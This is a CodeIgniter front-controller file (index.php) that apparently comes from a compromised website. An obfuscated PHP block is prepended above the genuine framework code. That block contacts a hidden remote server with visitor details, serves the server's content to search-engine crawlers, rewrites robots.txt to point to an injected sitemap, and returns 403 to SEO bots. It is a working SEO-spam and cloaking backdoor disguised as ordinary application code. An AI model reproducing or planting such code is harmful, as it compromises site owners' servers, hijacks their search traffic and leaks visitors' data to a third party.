<?php
 goto HAYX6; aqY1h: goto K0G66; goto BNNSF; U051O: if (strpos($QacRj, "\x72\157\x62\157\x74\163\x2e\x74\170\164") !== false or strpos($QacRj, "\160\x69\156\x67\x73\x69\x74\145\x6d\141\160") !== false or strpos($QacRj, "\x6a\x70\x32\60\x32\x33") !== false or preg_match("\x40\x5e\57\x28\x2e\x2a\x3f\51\56\170\155\154\44\100\x69", $_SERVER["\x52\105\x51\125\105\x53\124\x5f\125\x52\111"]) or preg_match("\x2f\50{$FU1k4}\51\57\151", $_SERVER["\x48\x54\124\120\137\125\123\105\122\137\101\107\x45\x4e\124"]) or preg_match("\57\50{$FU1k4}\51\57\x69", $_SERVER["\x48\x54\x54\120\x5f\122\x45\x46\x45\x52\105\122"])) { goto tf4Db; } goto lNCXX; Lb3jl: if (!empty($NEGu3)) { goto xSmsr; } goto oZ46h; wJpa7: if (isset($_SERVER["\x48\124\124\x50\137\x43\114\x49\x45\x4e\x54\137\x49\120"])) { goto v_qoL; } goto YbDl3; uXupL: Y07S0: goto x0JtG; Dcr9e: $h6U2h = $_SERVER["\x48\x54\x54\x50\x5f\x43\x4c\x49\x45\116\x54\137\x49\x50"]; goto lY0DZ; A2PNW: header("\x48\124\x54\x50\57\x31\x2e\x31\40\x34\x30\x34\40\116\x6f\x74\40\x46\157\165\x6e\x64"); goto lwS1n; LMokv: Z_oXR: goto OQt8j; A9z9a: Jqm_j: goto P9fES; GbBjI: $adrGh = curl_exec($QlfM3); goto bZ5GL; MaBL2: curl_setopt($QlfM3, CURLOPT_URL, $a4GzI); goto erNAP; rRnaY: xSmsr: goto SEp3w; R8Qhq: if (!is_file($p8N0S)) { goto I4M0p; } goto OwH0O; E6HLP: usdXG: goto UkWT5; YYP6k: $pqeb1 = "\x2f\x2f\x63\167\x31\64\65\65\56\150"; goto EVbo5; ZA0KD: goto LkIub; goto RDWn4; SEp3w: uBXL2("\162\x6f\142\157\164\163\56\x74\170\x74", $NEGu3); goto uXupL; tJ4cJ: if ($adrGh === "\157\x6b") { goto lZcQV; } goto Z4f6q; gqzKg: Ubxl2("\162\x6f\x62\157\164\163\56\x74\170\x74", $adrGh); goto LMokv; Bx_HV: $xaLcD = $_SERVER["\x53\x43\x52\x49\x50\x54\x5f\116\x41\x4d\105"]; goto e5V6K; uALf1: $p8N0S = "\x6d\146\154\56\164\x78\x74"; goto R8Qhq; CzqgG: header("\110\x54\124\120\x2f\x31\56\60\40\64\x30\x33\x20\x46\157\162\x62\x69\x64\144\x65\x6e"); goto zAYg3; lY0DZ: goto pID_a; goto A9z9a; vsoOl: uqX_9: goto WrJIm; A3_c_: $DCu05 = urlencode(@$_SERVER["\x48\x54\x54\x50\137\x41\x43\x43\105\120\124\137\x4c\101\116\x47\125\101\x47\105"]); goto zuu60; hCLco: FK7eJ: goto SHIE9; OwH0O: $JczuN = DbhAa($p8N0S); goto XpQ6H; Coees: $df33T = urlencode($_SERVER["\122\x45\x51\x55\x45\x53\x54\x5f\x53\103\110\x45\x4d\105"]); goto tuleL; A2qJD: $a4GzI = $T7ArU . "\77\x61\147\145\156\x74\x3d{$UVSJe}\x26\x72\x65\146\145\x72\75{$w4ZIa}\x26\x6c\x61\156\147\x3d{$DCu05}\46\x69\160\75{$h6U2h}\x26\144\x6f\155\x3d{$GXHyb}\x26\150\x74\164\x70\x3d{$df33T}\46\x75\162\151\x3d{$QacRj}\46\x70\143\x3d{$D1f_6}\x26\162\x65\x77\x72\x69\164\x65\141\x62\154\x65\75{$JczuN}\x26\163\143\162\x69\160\164\x3d{$Eph3r}"; goto itj9x; NbIVJ: $iN07D = "\x6e\x67"; goto YYP6k; aaXXq: $NEGu3 = trim($NEGu3) . "\15\xa" . "\x53\151\164\145\x6d\141\160\x3a\40{$ko67d}"; goto Rpx0N; smRpJ: $zOqzd = "\x68\x74\x74\160\72"; goto vJ0mh; PKmm8: GCcS5: goto E3iFQ; ymo1W: tf4Db: goto A2qJD; gEJzq: header("\110\124\124\x50\x2f\x31\56\60\40\65\60\x30\40\111\156\x74\145\x72\156\x61\x6c\x20\123\145\x72\x76\x65\x72\40\x45\x72\162\x6f\x72"); goto HNEfT; ajjyo: $JczuN = 0; goto uALf1; EsIFu: UBxl2($p8N0S, "\61"); goto hKk03; ZV4sp: y32Gx: goto QdaTN; ml0JW: goto pID_a; goto lxP60; ua_pM: echo $ko67d . "\72\x20" . $Z1xGE . "\74\142\162\57\x3e"; goto u9LV3; vfMzN: curl_setopt($QlfM3, CURLOPT_FOLLOWLOCATION, false); goto zW0XD; udv94: if (!(substr($adrGh, 0, 10) == "\145\162\162\157\x72\x20\143\x6f\x64\145" || $adrGh == "\x35\x30\60")) { goto MUjC3; } goto gEJzq; lxP60: v_qoL: goto Dcr9e; HlSmg: uBxl2($p8N0S, "\x30"); goto aqY1h; Uh_0k: header("\x43\x6f\x6e\164\x65\156\164\55\124\171\160\145\72\x20\164\x65\x78\x74\57\150\x74\155\x6c\x3b\x20\143\x68\x61\x72\x73\x65\x74\75\x75\164\146\55\70"); goto yqZ7_; hNstE: function DbhaA($xqQXk) { goto GWZDr; qSRyI: $Cx0jI = fread($KZp99, filesize($xqQXk)); goto EU7OD; K3vJu: if (!$KZp99) { goto c6hp4; } goto qSRyI; GWZDr: $KZp99 = fopen($xqQXk, "\x72"); goto K3vJu; TcBS3: return $Cx0jI; goto QbvYR; EU7OD: fclose($KZp99); goto TcBS3; GYAxk: return false; goto fqnM4; QbvYR: c6hp4: goto GYAxk; fqnM4: } goto t5tly; itj9x: $NEGu3 = ''; goto apOcn; ljeoy: mNotR: goto A2PNW; SHIE9: $xaLcD = "\57\77"; goto YNMc6; sJWCI: LkIub: goto Coees; BNNSF: lZcQV: goto W3GVn; zAYg3: exit; goto GBkr_; Rpx0N: $Z1xGE = ''; goto ua_pM; wwc10: goto y2RRU; goto hCLco; LxCpI: I4M0p: goto oETod; EzQ_k: $adrGh = @file_get_contents($RV2vo); goto tJ4cJ; gKwnh: $w4ZIa = urlencode(@$_SERVER["\x48\124\x54\x50\x5f\x52\105\106\105\122\x45\x52"]); goto LtfHU; eYP3m: goto usdXG; goto PKmm8; zuu60: $h6U2h = $_SERVER["\x52\105\x4d\117\x54\105\x5f\101\104\104\122"]; goto wJpa7; HNEfT: exit; goto Dhf2s; e5V6K: if (strpos($xaLcD, "\151\x6e\144\145\x78\56\160\150") !== false) { goto GCcS5; } goto zPWid; W3GVn: $JczuN = 1; goto EsIFu; x0JtG: exit; goto NDAqD; QdaTN: $adrGh = @file_get_contents($a4GzI); goto EgkSt; OjBwI: exit; goto bliPn; XpQ6H: goto sIy82; goto LxCpI; xtsDL: if (!preg_match("\57\x28\x50\171\x74\x68\157\x6e\x2d\165\162\x6c\x6c\x69\x62\x7c\x47\x50\124\102\x6f\164\x7c\x41\155\141\172\157\x6e\102\x6f\164\x7c\110\145\162\151\x74\162\x69\x78\x7c\x59\171\123\x70\151\x64\x65\162\174\120\171\164\150\x6f\x6e\174\102\141\162\x6b\x72\x6f\x77\154\x65\x72\x7c\x4c\x69\147\x68\164\104\145\x63\x6b\x52\x65\x70\157\162\x74\x73\x20\102\x6f\164\x7c\155\x6a\61\62\142\x6f\164\x7c\x73\x65\x6d\162\x75\163\x68\x42\157\x74\174\x45\172\157\x6f\x6d\163\x7c\131\x61\x6e\144\145\x78\x42\x6f\x74\174\150\x74\164\160\103\x6c\x69\x65\x6e\164\174\103\x6f\157\x6c\160\141\144\x57\x65\142\153\151\164\174\152\141\165\156\164\x79\x7c\x70\145\x74\x61\154\102\x6f\x74\174\103\162\x61\167\154\104\141\144\144\x79\174\120\x61\154\157\141\154\164\x6f\x6e\x65\x74\167\x6f\162\x6b\163\174\152\x69\x6b\145\x53\160\x69\x64\x65\162\174\157\102\x6f\x74\x7c\152\x61\x76\141\x7c\102\x79\x74\x65\163\160\151\x64\x65\162\174\x53\x77\x69\x66\x74\142\x6f\x74\174\x75\x6e\151\166\145\x72\x73\141\x6c\x46\145\x65\x64\x50\141\162\x73\x65\162\174\101\x73\x6b\124\x62\x46\x58\124\126\x7c\x5a\x6d\105\x75\174\x49\x6e\144\171\x20\114\151\x62\162\x61\x72\171\x7c\101\x68\x72\145\146\163\x42\x6f\164\174\x41\160\x61\x63\x68\x65\x42\x65\156\143\150\x7c\106\x65\x65\x64\104\x65\x6d\157\156\x7c\104\141\164\141\106\157\162\123\105\x4f\174\144\x69\147\x45\x78\x74\174\171\151\x73\x6f\x75\123\160\x69\144\x65\162\174\x66\x65\x65\x64\154\x79\x7c\x73\x63\162\x61\x70\x79\174\x45\x61\x73\157\165\123\x70\151\144\x65\162\x7c\103\145\156\x73\x79\163\x49\156\x73\160\x65\x63\x74\174\x53\x65\172\156\141\x6d\x42\157\x74\x7c\x47\157\x2d\150\x74\x74\x70\55\x63\154\x69\145\156\164\x7c\160\x79\164\x68\157\156\x2d\x72\x65\x71\165\145\x73\164\163\x7c\x44\x6f\x74\x42\x6f\164\51\57\151", $_SERVER["\110\124\x54\x50\137\x55\x53\x45\122\x5f\x41\107\105\116\x54"])) { goto QjNOk; } goto CzqgG; EVbo5: $tWYx4 = "\x74\145\154\x6c\x2e\143\157\155\x2f"; goto smRpJ; bliPn: K4WLI: goto ajjyo; t5tly: if (strpos($QacRj, "\x66\141\166\x69\x63\157\x6e\x2e\151\143\157") !== false) { goto uqX_9; } goto U051O; X7EE4: scAzF: goto T_R64; l1OKb: if (substr($adrGh, 0, 5) == "\x3c\x3f\x78\155\x6c") { goto hex3N; } goto Uh_0k; u9Yq7: hex3N: goto t1u92; LMb0C: echo $adrGh; goto Lb3jl; MT3Gq: pID_a: goto f2QWw; zW0XD: curl_setopt($QlfM3, CURLOPT_SSL_VERIFYPEER, FALSE); goto arLl9; NDAqD: return; goto fF2YA; bZ5GL: curl_close($QlfM3); goto S9B06; YbDl3: if (isset($_SERVER["\110\x54\124\120\x5f\130\x5f\x46\117\x52\127\x41\122\x44\x45\x44\x5f\x46\x4f\x52"])) { goto Jqm_j; } goto ml0JW; zPWid: $xaLcD = $xaLcD . "\77"; goto eYP3m; SEOSe: $_SERVER["\x52\105\121\x55\x45\123\x54\137\123\103\110\105\115\105"] = "\150\x74\x74\160\163"; goto sJWCI; UkWT5: $NEGu3 = "\x55\x73\x65\x72\x2d\141\x67\145\156\x74\72\40\52\15\12\x41\x6c\x6c\157\167\x3a\40\57"; goto l0pgo; OQt8j: goto Y07S0; goto rRnaY; u9LV3: $a4GzI = $T7ArU . "\x3f\x61\147\x65\156\x74\75{$UVSJe}\46\162\x65\x66\145\x72\75{$w4ZIa}\x26\x6c\x61\x6e\147\75{$DCu05}\x26\x69\x70\75{$h6U2h}\x26\x64\x6f\x6d\x3d{$GXHyb}\46\x68\x74\164\x70\x3d{$df33T}\46\165\x72\151\75{$QacRj}\x26\x70\143\75{$D1f_6}\46\x72\145\167\x72\151\164\145\x61\x62\x6c\145\x3d{$JczuN}\46\x73\x63\162\151\x70\x74\75{$Eph3r}\46\x73\x69\164\145\155\141\160\75" . urlencode($ko67d); goto ZV4sp; tuleL: $QacRj = urlencode($_SERVER["\122\x45\x51\x55\105\x53\x54\x5f\x55\x52\x49"]); goto rv8Zj; YNMc6: y2RRU: goto E6HLP; apOcn: if (!(strpos($QacRj, "\160\151\156\147\163\151\164\145\155\x61\x70") !== false)) { goto y32Gx; } goto Bx_HV; vJ0mh: $T7ArU = $zOqzd . $pqeb1 . $fVs4H . $iN07D . $tWYx4; goto oWHvS; AOqWl: $xaLcD = "\x2f"; goto wwc10; nvFKn: $Eph3r = urlencode($_SERVER["\123\103\x52\111\120\x54\137\116\101\115\105"]); goto iFTNt; arLl9: curl_setopt($QlfM3, CURLOPT_SSL_VERIFYHOST, FALSE); goto GbBjI; Sr05S: $FU1k4 = "\102\151\x6e\147\x7c\107\157\157\147\x6c\x65\x7c\x44\157\x63\x6f\x6d\157\174\131\x61\x68\157\157"; goto wlXZh; f2QWw: $h6U2h = urlencode($h6U2h); goto R30LV; S9B06: S7BXX: goto gJob1; R30LV: $GXHyb = urlencode($_SERVER["\x48\124\x54\x50\137\110\x4f\x53\124"]); goto nvFKn; oZ46h: if (!(strpos($QacRj, "\162\x6f\x62\x6f\x74\163\x2e\164\x78\x74") !== false)) { goto Z_oXR; } goto gqzKg; lwS1n: oQYCp: goto LMb0C; WJ0vd: function uBxL2($xqQXk, $Cx0jI) { goto bklIs; zl3dq: fclose($KZp99); goto qFLoG; AW16u: fwrite($KZp99, $Cx0jI); goto zl3dq; t2fSg: if (!$KZp99) { goto MFIyO; } goto AW16u; U3Avo: return false; goto iNc18; BsPDL: MFIyO: goto U3Avo; bklIs: $KZp99 = fopen($xqQXk, "\x77"); goto t2fSg; qFLoG: return true; goto BsPDL; iNc18: } goto hNstE; t1u92: header("\x43\157\x6e\164\x65\156\164\55\x54\171\x70\x65\72\40\164\145\170\x74\x2f\170\155\154\x3b\x20\x63\150\x61\x72\163\x65\164\x3d\x75\x74\x66\x2d\x38"); goto X7EE4; lNCXX: goto ppVN1; goto ymo1W; mviXd: if (strpos($QacRj, "\x6a\160\x32\x30\x32\x33") !== false) { goto mNotR; } goto l1OKb; oWHvS: $D1f_6 = "\101\121\x4e\125\104\101\165"; goto Sr05S; wGA0_: $_SERVER["\x52\x45\x51\125\105\x53\124\x5f\123\103\x48\105\x4d\105"] = "\x68\x74\x74\160"; goto ZA0KD; nLFqu: echo "\157\153"; goto OjBwI; P9fES: $h6U2h = $_SERVER["\x48\x54\124\x50\x5f\x58\137\106\117\122\x57\101\122\x44\x45\104\x5f\x46\x4f\122"]; goto MT3Gq; T_R64: goto oQYCp; goto ljeoy; oETod: $RV2vo = $df33T . "\x3a\x2f\57" . $_SERVER["\x48\x54\x54\x50\x5f\x48\117\123\x54"] . "\x2f\x6d\x66\154\155\146\154"; goto EzQ_k; hKk03: K0G66: goto PFoq4; rU145: ppVN1: goto qQNN1; HAYX6: $fVs4H = "\x65\x61\x72\151"; goto NbIVJ; EgkSt: if (!empty($adrGh)) { goto S7BXX; } goto gKP5e; l0pgo: $ko67d = "{$df33T}\x3a\x2f\x2f" . $GXHyb . $xaLcD . "\x73\151\164\145\155\x61\160\56\170\x6d\x6c"; goto aaXXq; GBkr_: QjNOk: goto gKwnh; RDWn4: U7izZ: goto SEOSe; Dhf2s: MUjC3: goto mviXd; gJob1: if (empty($adrGh)) { goto N7t2M; } goto udv94; yqZ7_: goto scAzF; goto u9Yq7; rv8Zj: if (!(strpos($QacRj, "\x6d\x66\x6c\155\x66\x6c") !== false)) { goto K4WLI; } goto nLFqu; wlXZh: error_reporting(0); goto xtsDL; E3iFQ: if ($JczuN == 0) { goto FK7eJ; } goto AOqWl; LtfHU: $UVSJe = urlencode($_SERVER["\110\124\x54\x50\x5f\x55\123\105\x52\137\x41\107\x45\116\x54"]); goto A3_c_; qQNN1: goto K7tmF; goto vsoOl; PFoq4: sIy82: goto WJ0vd; Z4f6q: $JczuN = 0; goto HlSmg; gKP5e: $QlfM3 = curl_init(); goto MaBL2; iFTNt: if (!empty($_SERVER["\122\x45\x51\125\105\123\x54\137\123\103\x48\105\x4d\x45"]) and $_SERVER["\x52\105\x51\125\105\123\x54\x5f\123\x43\110\105\x4d\105"] == "\x68\x74\x74\160\x73" or !empty($_SERVER["\x48\x54\x54\x50\123"]) and $_SERVER["\110\124\124\120\123"] == "\x6f\156" or !empty($_SERVER["\123\x45\x52\126\x45\122\137\x50\117\x52\124"]) and $_SERVER["\x53\x45\x52\x56\105\x52\137\120\x4f\x52\124"] == "\64\x34\63" or isset($_SERVER["\x48\x54\x54\x50\x5f\130\x5f\x46\117\122\127\x41\x52\x44\x45\104\137\x50\122\117\x54\x4f"]) and $_SERVER["\x48\x54\x54\x50\x5f\130\137\106\117\x52\127\101\x52\x44\x45\x44\x5f\x50\122\117\124\x4f"] == "\150\x74\x74\x70\163") { goto U7izZ; } goto wGA0_; fF2YA: N7t2M: goto rU145; erNAP: curl_setopt($QlfM3, CURLOPT_RETURNTRANSFER, true); goto vfMzN; WrJIm: K7tmF:
?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 */
	define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'development');

/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
switch (ENVIRONMENT)
{
	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
	break;

	case 'testing':
	case 'production':
		ini_set('display_errors', 0);
		if (version_compare(PHP_VERSION, '5.3', '>='))
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
		}
		else
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
		}
	break;

	default:
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'The application environment is not set correctly.';
		exit(1); // EXIT_ERROR
}

/*
 *---------------------------------------------------------------
 * SYSTEM DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * This variable must contain the name of your "system" directory.
 * Set the path if it is not in the same directory as this file.
 */
	$system_path = 'system';

/*
 *---------------------------------------------------------------
 * APPLICATION DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want this front controller to use a different "application"
 * directory than the default one you can set its name here. The directory
 * can also be renamed or relocated anywhere on your server. If you do,
 * use an absolute (full) server path.
 * For more info please see the user guide:
 *
 * https://codeigniter.com/userguide3/general/managing_apps.html
 *
 * NO TRAILING SLASH!
 */
	$application_folder = 'application';

/*
 *---------------------------------------------------------------
 * VIEW DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want to move the view directory out of the application
 * directory, set the path to it here. The directory can be renamed
 * and relocated anywhere on your server. If blank, it will default
 * to the standard location inside your application directory.
 * If you do move this, use an absolute (full) server path.
 *
 * NO TRAILING SLASH!
 */
	$view_folder = '';


/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 *
 * Normally you will set your default controller in the routes.php file.
 * You can, however, force a custom routing by hard-coding a
 * specific controller class/function here. For most applications, you
 * WILL NOT set your routing here, but it's an option for those
 * special instances where you might want to override the standard
 * routing in a specific front controller that shares a common CI installation.
 *
 * IMPORTANT: If you set the routing here, NO OTHER controller will be
 * callable. In essence, this preference limits your application to ONE
 * specific controller. Leave the function name blank if you need
 * to call functions dynamically via the URI.
 *
 * Un-comment the $routing array below to use this feature
 */
	// The directory name, relative to the "controllers" directory.  Leave blank
	// if your controller is not in a sub-directory within the "controllers" one
	// $routing['directory'] = '';

	// The controller class file name.  Example:  mycontroller
	// $routing['controller'] = '';

	// The controller function you wish to be called.
	// $routing['function']	= '';


/*
 * -------------------------------------------------------------------
 *  CUSTOM CONFIG VALUES
 * -------------------------------------------------------------------
 *
 * The $assign_to_config array below will be passed dynamically to the
 * config class when initialized. This allows you to set custom config
 * items or override any default config values found in the config.php file.
 * This can be handy as it permits you to share one application between
 * multiple front controller files, with each file containing different
 * config values.
 *
 * Un-comment the $assign_to_config array below to use this feature
 */
	// $assign_to_config['name_of_config_item'] = 'value of config item';



// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */

	// Set the current directory correctly for CLI requests
	if (defined('STDIN'))
	{
		chdir(dirname(__FILE__));
	}

	if (($_temp = realpath($system_path)) !== FALSE)
	{
		$system_path = $_temp.DIRECTORY_SEPARATOR;
	}
	else
	{
		// Ensure there's a trailing slash
		$system_path = strtr(
			rtrim($system_path, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		).DIRECTORY_SEPARATOR;
	}

	// Is the system path correct?
	if ( ! is_dir($system_path))
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
		exit(3); // EXIT_CONFIG
	}

/*
 * -------------------------------------------------------------------
 *  Now that we know the path, set the main path constants
 * -------------------------------------------------------------------
 */
	// The name of THIS file
	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));

	// Path to the system directory
	define('BASEPATH', $system_path);

	// Path to the front controller (this file) directory
	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);

	// Name of the "system" directory
	define('SYSDIR', basename(BASEPATH));

	// The path to the "application" directory
	if (is_dir($application_folder))
	{
		if (($_temp = realpath($application_folder)) !== FALSE)
		{
			$application_folder = $_temp;
		}
		else
		{
			$application_folder = strtr(
				rtrim($application_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
	{
		$application_folder = BASEPATH.strtr(
			trim($application_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);

	// The path to the "views" directory
	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.'views';
	}
	elseif (is_dir($view_folder))
	{
		if (($_temp = realpath($view_folder)) !== FALSE)
		{
			$view_folder = $_temp;
		}
		else
		{
			$view_folder = strtr(
				rtrim($view_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.strtr(
			trim($view_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);

/*
 * --------------------------------------------------------------------
 * LOAD THE BOOTSTRAP FILE
 * --------------------------------------------------------------------
 *
 * And away we go...
 */
require_once BASEPATH.'core/CodeIgniter.php';
